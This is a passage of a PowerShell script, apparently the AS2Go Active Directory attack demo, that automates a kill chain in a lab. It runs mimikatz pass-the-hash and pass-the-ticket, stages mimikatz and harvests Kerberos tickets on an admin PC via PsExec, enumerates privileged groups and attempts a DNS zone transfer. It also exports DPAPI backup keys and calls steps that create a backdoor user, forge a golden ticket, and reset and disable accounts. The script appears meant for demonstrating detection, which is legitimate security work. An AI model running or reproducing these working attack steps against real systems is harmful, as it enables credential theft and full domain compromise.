    Pause
}
else
{
    Write-Log "Skipped - Try to Dump Credentials In-Memory from VictimPC"
    return
}

Do 
{
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "                   overpass-the-Hash 'PtH' attack                   "
    Write-Host "____________________________________________________________________`n" 
    Write-Host ""
    Write-Host "Compromised User Account - $helpdeskuser" -ForegroundColor $global:FGCHighLight
    Write-Host "NTML Hash                - $pthntml"      -ForegroundColor $global:FGCHighLight

    $question = "`nAre these values correct - Y or N? Default "
    $prompt   = Get-Answer -question $question -defaultValue $yes
    
    if ($prompt -ne $yes) 
        
        {

        $question = "`n -> Is this user $helpdeskuser  correct - Y or N? Default "
        $prompt   = Get-Answer -question $question -defaultValue $yes
    
        if ($prompt -ne $yes) 
          {
           $helpdeskuser = Read-Host "New PtH Victim"
          }
 
  
        $question = "`n -> Is this NTLH HASH for $helpdeskuser  correct - Y or N? Default "
        $prompt   = Get-Answer -question $question -defaultValue $yes
    
        if ($prompt -ne $yes) 
        {
            $pthntml = Read-Host "New NTML Hash for $helpdeskuser"
            Set-KeyValue -key "pthntml" -NewValue $pthntml
        }


        }

} Until ($prompt -eq $yes)




.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:$helpdeskuser /ntlm:$pthntml /domain:$fqdn" "exit"


Write-Host "____________________________________________________________________`n"  -ForegroundColor Red
Write-Host "     #            use                                         #     " -ForegroundColor Red
Write-Host "     #                the                                     #     " -ForegroundColor Red
Write-Host "     #                    new                                 #     " -ForegroundColor Red
Write-Host "     #                        DOS                             #     " -ForegroundColor Red
Write-Host "     #                            window                      #     " -ForegroundColor Red
Write-Host "____________________________________________________________________`n"  -ForegroundColor Red




Write-Host "`n`nplease run the following commands from the new DOS Windows:`n" -ForegroundColor $global:FGCQuestion
Write-Host "cd C:\<location>\AS2Go" -ForegroundColor $global:FGCCommand
Write-Host "powershell.exe -file .\AS2Go.ps1" -ForegroundColor $global:FGCCommand



Set-KeyValue -key "LastStage" -NewValue $stage20

Stop-Process -Name iexplore -Force



#####
Write-Log -Message "### End Function $myfunction ###"
Pause
}

function Start-PtT-Attack {
$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####
$hostname = $env:computername
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "              Pass-the-Ticket 'PtT' attack                          "
Write-Host "                                                                    "
Write-Host "                - stage mimikatz on Admin PC                        "
Write-Host "                - harvest Ticket on Admin PC                        "
Write-Host "                - PtT to become Domain Admin                        "
Write-Host "____________________________________________________________________`n" 
write-host ""
Pause
Clear-Host
# remove all old tickets
Try
{
#Get-Item \\$hostname\$ticketsUNCPath\*.kirbi
Remove-Item \\$hostname\$ticketsUNCPath\*.kirbi
#Get-Item \\$hostname\$ticketsUNCPath\*.kirbi 
Remove-Item -Recurse \\$mySAW\$ticketsUNCPath -ErrorAction SilentlyContinue
}
Catch
{
}


Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "           stage mimikatz on Admin PC $mySAW                        "  
Write-Host "____________________________________________________________________`n" 
write-host ""

#cleanup
Remove-Item -Recurse \\$mySAW\$ticketsUNCPath -ErrorAction Ignore
New-Item \\$mySAW\$ticketsUNCPath -ItemType directory -ErrorAction Ignore

Write-Host ".\mimikatz.exe -Destination \\$mySAW\$ticketsUNCPath -Recurse`n" -ForegroundColor $global:FGCCommand
Copy-Item -Path ".\mimikatz.exe" -Destination \\$mySAW\$ticketsUNCPath -Recurse


#workaround
$files = "\\$mySAW\$ticketsUNCPath\*.exe"
#Write-Host "Get-Item $files | Write-Output`n" -ForegroundColor $global:FGCCommand
Get-Item $files | Write-Output

Pause

Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "           harvest tickets on Admin PC $mySAW                      "
Write-Host "____________________________________________________________________`n" 
write-host ""
write-host ""
write-host "PsExec.exe \\$mySAW -accepteula cmd /c (cd c:\temp\tickets & mimikatz.exe ""privilege::debug"" ""sekurlsa::tickets /export""  ""exit"")" -ForegroundColor $global:FGCCommand
write-host ""
write-host ""

.\PsExec.exe \\$mySAW -accepteula cmd /c ('cd c:\temp\tickets & mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"  "exit"')
Pause



Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "            list tickets on Admin PC $mySAW                        "
Write-Host "____________________________________________________________________`n" 
write-host ""

$files = "\\$mySAW\$ticketsUNCPath\*.kirbi"
#Write-Host "Get-Item $files | Write-Output" -ForegroundColor $global:FGCCommand


$test = Get-Item $files -Force
Write-Host
Write-Output $test

#Get-Content -Path $tmp

Pause
Clear-Host

Write-Host "____________________________________________________________________`n" 
Write-Host "  copy $domainadmin tickets from Admin PC '$mySAW' to Victim PC "
Write-Host "____________________________________________________________________`n" 
write-host ""
New-Item \\$hostname\$ticketsUNCPath -ItemType directory -ErrorAction Ignore
Get-Item \\$mySAW\$ticketsUNCPath\*$domainadmin* | Copy-Item -Destination \\$hostname\$ticketsUNCPath


$files = "\\$hostname\$ticketsUNCPath\*.kirbi"
#Write-Host "Get-Item $files | Write-Output" -ForegroundColor $global:FGCCommand
Get-Item $files | Write-Output

Pause
Remove-Item -Recurse \\$mySAW\$ticketsUNCPath
Clear-Host
Write-Host "____________________________________________________________________`n" 
write-host "     load stolen tickets from $domainadmin on VictimPC"
write-host "                    to become a Domain Admin"
Write-Host "____________________________________________________________________`n" 
write-host ""
write-host ".\mimikatz.exe ""privilege::debug"" ""kerberos::ptt \\$hostname\$ticketsUNCPath"" ""exit""" -ForegroundColor $global:FGCCommand 
Pause
Clear-Host
.\mimikatz.exe "privilege::debug" "kerberos::ptt \\$hostname\$ticketsUNCPath" "exit"
Pause
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "       Displays a list of currently cached Kerberos tickets         "
Write-Host "____________________________________________________________________`n" 
Pause
write-host ""
Set-KeyValue -key "LastStage" -NewValue $PtT
Set-NewColorSchema -NewStage $PtT
klist
Pause
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "                 2nd TRY connect to DCs c$ share                    "   
Write-Host "____________________________________________________________________`n" 
write-host ""

#Access-Directory -directory "\\$mydc\c$\*.*"
#workaround
$directory = "\\$myDC\c$"
(Get-Directories -Path $directory) | Out-File -FilePath $tmp
Get-Content -Path $tmp


Pause
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "        2nd TRY to list NetBIOS sessions on Domain Controller       "
Write-Host "____________________________________________________________________`n" 
write-host ""
write-host " NetSess.exe $mydc"
write-host ""
write-host ""

Start-NetSess -server $mydc
Pause

#####
Write-Log -Message "### End Function $myfunction ###"
}

function Start-NetSess {
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $server
    )


$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

.\NetSess.exe $server



#####
Write-Log -Message "### End Function $myfunction ###"
}

function Start-Reconnaissance-Part1 {
$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
####
Write-Host "____________________________________________________________________`n" 
Write-Host "                TRY to enumerate Domain Admins members              "
Write-Host "____________________________________________________________________`n`n" 

Write-Host " Get-ADGroupMember -Identity 'Domain Admins' -Recursive | ft" -ForegroundColor $global:FGCCommand
Write-Host ""
Get-SensitveADUser -group "Domain Admins"
Pause
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "       TRY to find Domain COMPUTER and connect to one c$ share      "
Write-Host "____________________________________________________________________`n`n" 

Write-Host "Get-ADComputer -Filter * | ft Name, Enabled, DistinguishedName" -ForegroundColor $global:FGCCommand
Write-Host ""
Get-ADComputer -Filter * | ft Name, Enabled, DistinguishedName


Write-Host ""
#workaround
$directory = "\\$mySAW\c$"
(Get-Directories -Path $directory) | Out-File -FilePath $tmp
Get-Content -Path $tmp



Pause
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "            TRY to find DC's and connect to one c$ share            "
Write-Host "____________________________________________________________________`n`n" 

Write-Host " Get-ADDomainController | ft hostname, IsGlobalCatalog, IPv4Address, ComputerObjectDN" -ForegroundColor $global:FGCCommand
Write-Host ""
Get-ADDomainController | ft hostname, IsGlobalCatalog, IPv4Address, ComputerObjectDN
Write-Host ""
#workaround
$directory = "\\$myDC\c$"
(Get-Directories -Path $directory) | Out-File -FilePath $tmp
Get-Content -Path $tmp
Write-Host ""
Write-Host ""
Pause
####
Write-Log -Message "### End Function $myfunction ###"
}

function Start-Reconnaissance-Part2 {
$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
####
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "       TRY to enumerate Group Policy Creator Owners members         "
Write-Host "____________________________________________________________________`n" 

Write-Host " Get-ADGroupMember -Identity 'Group Policy Creator Owners' -Recursive | ft" -ForegroundColor $global:FGCCommand
Write-Host ""
Get-SensitveADUser -group "Group Policy Creator Owners"
Write-Host ""
Write-Host ""
Pause
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "            TRY to enumerate Enterprise Admins members              "
Write-Host "____________________________________________________________________`n" 

Write-Host " Get-ADGroupMember -Identity 'Enterprise Admins' -Recursive | ft" -ForegroundColor $global:FGCCommand
Write-Host ""
Get-SensitveADUser -group "Enterprise Admins"
Write-Host ""
Pause
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "            open new window for Domain Zone Transfer                "
Write-Host "____________________________________________________________________`n" 
Write-Host " use command: ls -d $fqdn" -ForegroundColor $global:FGCCommand
Write-Host ""
Write-Host ""

try
{
Write-Output "ls -d $fqdn" | Set-Clipboard
}
catch
{
Write-Output "ls -d $fqdn" | clip
}


Start-Process nslookup
Pause
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "          TRY to list NetBIOS sessions on Domain Controller         "
Write-Host "____________________________________________________________________`n" 
Write-Host ""
Write-Host ".\NetSess.exe $mydc" -ForegroundColor $global:FGCCommand
Write-Host ""
Start-NetSess -server $mydc
Write-Host ""
Write-Host ""

### hidden alert ####
New-HoneytokenActivity

Pause
####
Write-Log -Message "### End Function $myfunction ###"
}

function Get-FunctionName ([int]$StackNumber = 1) {
    return [string]$(Get-PSCallStack)[$StackNumber].FunctionName
}

Function Write-Log {
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$False)]
    [ValidateSet("INFO","WARN","ERROR","FATAL","DEBUG")]
    [String]
    $Level = "INFO",

    [Parameter(Mandatory=$True)]
    [string]
    $Message,

    [Parameter(Mandatory=$False)]
    [string]
    $logfile = $scriptLog
    )

    $Stamp = (Get-Date).toString("yyyy/MM/dd HH:mm:ss")
    $Line = "$Stamp $Level $Message"
    If($logfile) {
        Add-Content $logfile -Value $Line
    }
    Else {
        Write-Output $Line
    }
}

Function Show-Step {

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $step
   )

Invoke-Item ".\$step"
#& $ImageViewer "$path\$step"


}

function Check-FileAvailabliy {

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $filename
    )

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####


If ((Test-Path -Path "$path\$filename" -PathType Leaf) -eq $false)
    {
    Write-Host ""
    Write-Warning "Cannot find file - $filename!!"
    Write-Host ""
    If ($filename.ToUpper() -eq "AS2Go.xml".ToUpper())
    {
    Write-Host "`n`nProbably you started the PoSH Script $scriptName `nfrom the wrong directory $configFile!" -ForegroundColor $global:FGCError
    exit
    }
    Pause
    }

#####
Write-Log -Message "### End Function $myfunction ###"
}

function Check-PoSHModuleAvailabliy {

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $PSModule
    )

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

Import-Module $PSModule -ErrorAction SilentlyContinue

If ((Get-Module $PSModule) -eq $null)
    {
    Write-Host ""
    Write-Warning "The PowerShell '$PSModule' Module is missing!!"
    Write-host    "`nPlease install the PowerShell $PSModule Module" 
    Write-host    "e.g. https://theitbros.com/install-and-import-powershell-active-directory-module"
    Write-Host ""
    Write-Log -Message "The PowerShell '$PSModule' Module is missing!!"
    Pause
    }
    else
    {

}

#####
Write-Log -Message "### End Function $myfunction ###"
}


############################################################################################
#
#                             Starting the script
#
############################################################################################

Function Start-AS2GoDemo {

Write-Log -Message "."
Write-Log -Message "."
Write-Log -Message "##################################################################"
Write-Log -Message "#                                                                #"
Write-Log -Message "                  Starting Script $scriptName "
Write-Log -Message "#                                                                #"
Write-Log -Message "##################################################################"
Write-Log -Message "."
Write-Log -Message "."

# check the correct directory and requirements
Check-FileAvailabliy -filename "AS2Go.xml"
Check-FileAvailabliy -filename "mimikatz.exe"
Check-FileAvailabliy -filename "PsExec.exe"
Check-FileAvailabliy -filename "NetSess.exe"

Check-PoSHModuleAvailabliy -PSModule "ActiveDirectory"
Import-Module ActiveDirectory


$demo = Get-KeyValue -key "DemoTitle"
Update-WindowTitle -NewTitle $demo

Clear-Host
Set-NewColorSchema -NewStage $PtT

$laststage = Get-KeyValue -key "LastStage"

If ($laststage -eq $stage50)
    {
    $StartValue = $yes

    } 
    else
    {
    $StartValue = $no
    } 

$question = "`nStarts the use case from the begin? Default "
$answer   = Get-Answer -question $question -defaultValue $StartValue

If ($answer -eq $yes)

{
Set-KeyValue -key "LastStage" -NewValue $stage50
Set-NewColorSchema -NewStage $InitialStart


Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "        Attack scenario to GO | along the kill-chain                "
Write-Host "                                                                    "
Write-Host "        AS2Go.ps1   Version $version              "
Write-Host "                                                                    "
Write-Host "        created by hozimmer@microsoft.com                           "
Write-Host "        last update $lastupdate                                      "
Write-Host "                                                                    "
Write-Host "        Used tools / Requirements:                                  "
Write-Host "                                                                    "
Write-Host "         + mimikatz.exe                                             "
Write-Host "         + NetSess.exe - enumerate NetBIOS Sessions                 "
Write-Host "         + PsExec.exe                                               "
Write-Host "         + Powershell ACTIVE DIRECTORY module                       "
Write-Host "____________________________________________________________________`n" 

$TimeStamp    = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
$lastVictim   = Get-KeyValue -key "LastVictim"
$lastRun      = Get-KeyValue -key "LastStart" 
$lastDuration = Get-KeyValue -key "LastDuration" 

Write-Host "`nCurrent Date & Time: $TimeStamp" 
Write-Host ""
Write-Host "Last Run:            " -NoNewline
Write-Host $lastRun                -NoNewline -ForegroundColor $global:FGCHighLight
Write-Host " | "                   -NoNewline
Write-Host $lastDuration           -NoNewline -ForegroundColor $global:FGCHighLight
Write-Host " | Last Victim: "      -NoNewline  
Write-Host "[$lastVictim]"         -ForegroundColor $global:FGCHighLight
Write-Host "`n"
#Update AS2Go.xml config file
Set-KeyValue -key "LastStart" -NewValue $TimeStamp
Pause

################################################################################
######                                                                     #####
######                Setting update                                       #####
######                                                                     #####
################################################################################

Clear-Host
Get-AS2GoSettings
}
else
{
$PrivledgeAccount = $yes
Set-NewColorSchema -NewStage $PtH
#read values from AS2Go.xml config file
}

#read values from AS2Go.xml config file
$myDC =           Get-KeyValue -key "myDC" 
$mySAW =          Get-KeyValue -key "mySAW" 
$myViPC =         Get-KeyValue -key "myViPC"
$fqdn =           Get-KeyValue -key "fqdn"
$pthntml =        Get-KeyValue -key "pthntml"
$krbtgtntml =     Get-KeyValue -key "krbtgtntml"
$ImageViewer =    Get-KeyValue -key "ImageViewer"
$globalHelpDesk = Get-KeyValue -key "globalHelpDesk"
$ticketsUNCPath = Get-KeyValue -key "ticketsPath"
$ticketsDir     = Get-KeyValue -key "ticketsDir"
$time2reboot    = Get-KeyValue -key "time2reboot"
$BDUsersOU      = Get-KeyValue -key "BDUsersOU"
$MySearchBase   = Get-KeyValue -key "MySearchBase"
$OfflineDITFile = Get-KeyValue -key "OfflineDITFile"
$myAppServer    = Get-KeyValue -key "myAppServer"
$UseCase        = Get-KeyValue -key "usecase"

Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "            Today I use these three (3) accounts                    "
Write-Host "____________________________________________________________________`n" 

$victim         = $env:UserName
#$victim = "VI-20210811"
$suffix = $victim.Substring(3)

$question = "`n -> Enter or confirm your account suffix! Default "
$suffix = Get-Answer -question $question -defaultValue $suffix


#Clear-Host
$victim       = "VI-$suffix"
$helpdeskuser = "HD-$suffix"
$domainadmin  = "DA-$suffix"


Write-Host ""
Write-Host "  Compromised User Account  --  " -NoNewline
Write-Host                                  $victim -ForegroundColor $global:FGCHighLight        
Write-Host "  Helpdesk User             --  $helpdeskuser"
Write-Host "  Domain Admin              --  $domainadmin"
Write-Host ""
Write-Host "  Victim Maschine           --  $myViPC"
Write-Host "  Admin Maschine            --  $mySAW" 
Write-Host "  Domain Controller         --  $myDC" 
Write-Host ""

Set-KeyValue -key "LastVictim" -NewValue $victim


Pause


################################################################################
######                                                                     #####
######                Attack Level - COMPROMISED User Account              #####
######                                                                     #####
################################################################################

Update-WindowTitle -NewTitle $stage00
#Set-KeyValue -key "LastStage" -NewValue $stage10
Show-Step -step "step_000.html"

Do
{
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "            Attack Level - COMPROMISED User Account                 "
Write-Host "                Was this a PRIVLEDGE(!) Account?                    "
Write-Host "____________________________________________________________________`n" 

$question = "`n -> Enter (Y) to confirm or (N) for a non-sensitive user! Default "
$answer   = Get-Answer -question $question -defaultValue $PrivledgeAccount


If ($answer -eq $yes)

{
    Write-Log -Message "Starting with a PRIVLEDGE(!) COMPROMISED User Account"
	$UserPic= "step_008.html"
	$Account= "PRIVLEDGE(!) Compromised "
    $PrivledgeAccount = $yes
    $LateralMovement  = $PtT
	$reconnaissance   = $yes
    Set-NewColorSchema -NewStage $PtH
}
else
{
    
    Write-Log -Message "Starting with a non-sensitive COMPROMISED User Account"
	$UserPic= "step_005.html"
	$Account= "non-sensitive Compromised"
    $PrivledgeAccount = $no
    $LateralMovement  = $PtH
	$reconnaissance   = $no
    Set-NewColorSchema -NewStage $InitialStart
}

#Pause
Show-Step -step $UserPic
Start-NetSess -server $myDC

Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "        Starting with $Account User Account        "
Write-Host "____________________________________________________________________`n" 
Write-Host "`n NEXT STEP: " -NoNewline
Write-Host "user $victim /domain`n" -ForegroundColor $global:FGCCommand

$question = "`nDo you want to run this step - Y or N? Default "
$answer   = Get-Answer -question $question -defaultValue $Yes

If ($answer -eq $yes)
    {
    Write-Host ""
    Write-Host ""
    net user $victim /domain
    Write-Host ""
    Pause
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "        Displays a list of currently cached Kerberos tickets        "
    Write-Host "____________________________________________________________________`n" 
    Write-Host "`n NEXT STEP: " -NoNewline
    Write-Host "KLIST`n" -ForegroundColor $global:FGCCommand
    Pause
    Write-Host ""
    klist
    Pause
    Clear-Host
}
elseIf ($answer -eq $exit)
{
    Stop-AS2GoDemo
}
else
{
}


Write-Host "____________________________________________________________________`n" 
Write-Host "      ??? REPEAT | Attack Level - COMPROMISED User Account ???      "
Write-Host "____________________________________________________________________`n" 

# End "Do ... Until" Loop?
$question = "`nDo you need to REPEAT this attack level - Y or N? Default "
$repeat   = Get-Answer -question $question -defaultValue $no
   
} Until ($repeat -eq $no)


################################################################################
######                                                                     #####
######                Attack Level - RECONNAISSANCE                        #####
######                                                                     #####
################################################################################
Update-WindowTitle -NewTitle $stage10
#Set-KeyValue -key "LastStage" -NewValue $stage10
Show-Step -step "step_006.html"
Do 
{
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "                   Attack Level - RECONNAISSANCE                    "
Write-Host "       try to collect reconnaissance and configuration data         "
Write-Host "____________________________________________________________________`n" 

$question = "`nDo you want to run this step - Y or N? Default "
$answer   = Get-Answer -question $question -defaultValue $Yes

If ($answer -eq $yes)
{


    
    Start-Reconnaissance-Part1

    $question = "`nFurther reconnaissance tasks - Y or N? Default "
    $answer   = Get-Answer -question $question -defaultValue $reconnaissance

    If ($answer -eq $yes)
    {
        Start-Reconnaissance-Part2
    }
}
elseIf ($answer -eq $exit)
{
    Stop-AS2GoDemo
}
else
{
}


Clear-Host

Write-Host "____________________________________________________________________`n" 
Write-Host "        ??? REPEAT | Attack Level - RECONNAISSANCE  ???             "
Write-Host "____________________________________________________________________`n" 

# End "Do ... Until" Loop?
$question = "`nDo you need to REPEAT this attack level - Y or N? Default "
$repeat   = Get-Answer -question $question -defaultValue $no
   
} Until ($repeat -eq $no)


################################################################################
######                                                                     #####
#"#####                Attack Level - LATERAL MOVEMENT                           "
######                                                                     #####
################################################################################
Update-WindowTitle -NewTitle $stage20
Set-KeyValue -key "LastStage" -NewValue $stage20
Show-Step -step "step_007.html"
Do 
{
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "                 Attack Level - LATERAL MOVEMENT                    "
Write-Host "            Choose your Lateral Movement Technique!                 "
Write-Host "____________________________________________________________________`n" 

$question = "`nEnter Pass-the-Hash (H), Pass-the-Ticket (T) or skip (S) this step! Default "
$answer   = Get-Answer -question $question -defaultValue $LateralMovement

If ($answer -eq $PtH)

{
    #Starting Pass-the-Hash (PtH) Attack on VictimPC
    Show-Step -step step_007_PtH.html  
    Start-PtH-Attack
}
elseif ($answer -eq $PtT)

{
    Show-Step -step step_007_PtT.html 
    Start-PtT-Attack
}

else
{
    Write-Host "Attack Level - LATERAL MOVEMENT was skipped" -ForegroundColor red
}

Clear-Host

Write-Host "____________________________________________________________________`n" 
Write-Host "        ??? REPEAT | Attack Level - LATERAL MOVEMENT  ???           "
Write-Host "____________________________________________________________________`n" 

# End "Do ... Until" Loop?
$question = "`nDo you need to REPEAT this attack level - Y or N? Default "
$repeat   = Get-Answer -question $question -defaultValue $no
   
} Until ($repeat -eq $no)


################################################################################
######                                                                     #####
#"#####                Attack Level - ACCESS SENSITIVE DATA                      "
######                                                                     #####
################################################################################
Update-WindowTitle -NewTitle $stage30
Set-KeyValue -key "LastStage" -NewValue $stage30
Show-Step "step_010.html"

Do
{

Clear-Host

Write-Host "____________________________________________________________________`n" 
Write-Host "                Attack Level - ACCESS SENSITIVE DATA                "
Write-Host "               Try to find and exfiltrate these data                "
Write-Host "____________________________________________________________________`n" 

$question = "`nDo you want to run this step - Y or N? Default "
$answer   = Get-Answer -question $question -defaultValue $Yes

If ($answer -eq $yes)
{

    Start-Exfiltration
    
}



Clear-Host

Write-Host "____________________________________________________________________`n" 
Write-Host "        ??? REPEAT | Attack Level - ACCESS SENSITIVE DATA  ???      "
Write-Host "____________________________________________________________________`n" 


# End "Do ... Until" Loop?
$question = "`nDo you need to REPEAT this attack level - Y or N? Default "
$repeat   = Get-Answer -question $question -defaultValue $no
   
} Until ($repeat -eq $no)


################################################################################
######                                                                     #####
######                Attack Level - DOMAIN COMPROMISED AND PERSISTENCE    #####
######                                                                     #####
################################################################################
Update-WindowTitle -NewTitle $stage40
Set-KeyValue -key "LastStage" -NewValue $stage40
Show-Step step_012.html
Do
{
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "          Attack Level - DOMAIN COMPROMISED AND PERSISTENCE         "
Write-Host "                                                                    "
Write-Host "            #1 - create back door user                              "
Write-Host "            #2 - export DPAPI master key                            "
Write-Host "            #3 - create golden ticket                               "
Write-Host "            #4 - PW reset and disable users                         "
Write-Host "            #5 - Encrypt files                          "
Write-Host "            #6 - reboot (all machines)                              "  
Write-Host "____________________________________________________________________`n" 

$question = "`nDo you want to run these steps - Y or N? Default "
$answer   = Get-Answer -question $question -defaultValue $Yes

If ($answer -eq $yes)
    {
    Clear-Host

    

    Write-Host "____________________________________________________________________`n" 
    Write-Host "        Create Back Door User and Add to Sensitive Groups           "
    Write-Host "____________________________________________________________________`n"     
    
    $question = "`nDo you want to run this step - Y or N? Default "
    $answer   = Get-Answer -question $question -defaultValue $Yes

    If ($answer -eq $yes)
    {
    New-BackDoorUser
    } 
    
    Pause
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "        try to export DATA PROTECTION API master key                "
    Write-Host "____________________________________________________________________`n"     
    write-host "Attackers can use the master key to decrypt ANY secret `nprotected by DPAPI on all domain-joined machines" -ForegroundColor $global:FGCHighLight
    write-host ""
    Write-Host "`n NEXT STEP: " -NoNewline
    Write-Host "mimikatz.exe ""privilege::debug"" ""lsadump::backupkeys /system:$mydc.$fqdn /export"" ""exit""`n" -ForegroundColor $global:FGCCommand
    
    $question = "`nDo you want to run this step - Y or N? Default "
    $answer   = Get-Answer -question $question -defaultValue $Yes

    If ($answer -eq $yes)
    {
        New-Item $exfiltration -ItemType directory -ErrorAction Ignore
        .\mimikatz.exe "cd $exfiltration" "privilege::debug" "lsadump::backupkeys /system:$mydc.$fqdn /export" "exit"
        dir "$exfiltration\ntds_*"
        Pause
    }
     
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "        create golden ticket for an unknown user                    "
    Write-Host "____________________________________________________________________`n"     

    $question = "`nDo you want to run this step - Y or N? Default "
    $answer   = Get-Answer -question $question -defaultValue $Yes

    If ($answer -eq $yes)
    {

        #run function
        CreateGoldenTicket
    } 
    

    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "            User Manipulation - Disable & PW reset                   "
    Write-Host "____________________________________________________________________`n" 
  
    Write-host "Your NEW backdoor user $global:BDUser use will be ignored :-)" -ForegroundColor $global:FGCHighLight    
        
    $question = "`nDo you want to run these steps - Y or N? Default "
    $answer   = Get-Answer -question $question -defaultValue $Yes

    If ($answer -eq $yes)
    {
        $MySearchBase = Get-KeyValue -key "MySearchBase"
        Start-UserManipulation -SearchBase $MySearchBase
    } 
    
    
    Pause
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "                 ran ransomware attack?                               "
    Write-Host "____________________________________________________________________`n"     
    
    $question = "`nDo you want to run this step - Y or N? Default "
    $answer   = Get-Answer -question $question -defaultValue $no

    If ($answer -eq $yes)
    {
        #run functions
      #SimulateRansomare -Computer $mySAW
    }





    Pause
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "                 reboot (all machines)                              "
    Write-Host "____________________________________________________________________`n"     
    
    $question = "`nDo you want to run this step - Y or N? Default "
    $answer   = Get-Answer -question $question -defaultValue $Yes

    If ($answer -eq $yes)
    {
        #run functions
        Stop-AS2GoDemo -NextStepReboot $yes
        Restart-VictimMachines
    }
}
Clear-Host

Write-Host "____________________________________________________________________`n" 
Write-Host "        ??? REPEAT | Attack Level - DOMAIN COMPROMISED ???          "
Write-Host "____________________________________________________________________`n" 


    $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
    $repeat   = Get-Answer -question $question -defaultValue $no

   
} Until ($repeat -eq $no)

################################################################################
######                                                                     #####
#"#####                         CLEAN UP                                         "
######                                                                     #####
################################################################################

Stop-AS2GoDemo


<# Ideen 

#>
}

Start-AS2GoDemo
